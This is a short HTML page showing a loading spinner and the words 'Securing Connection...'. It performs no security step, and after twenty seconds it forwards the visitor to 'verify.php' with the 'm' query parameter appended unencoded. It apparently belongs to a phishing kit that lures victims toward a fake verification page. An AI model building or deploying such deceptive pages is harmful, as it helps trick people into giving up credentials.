<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; background: #fff; }
        .loader { border: 6px solid #f3f3f3; border-top: 6px solid #0056b3; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Securing Connection...</p>

    <script>
        setTimeout(function() {
            const params = new URLSearchParams(window.location.search);
            window.location.href = 'verify.php?m=' + params.get('m');
        }, 20000);
    </script>
</body>
</html>
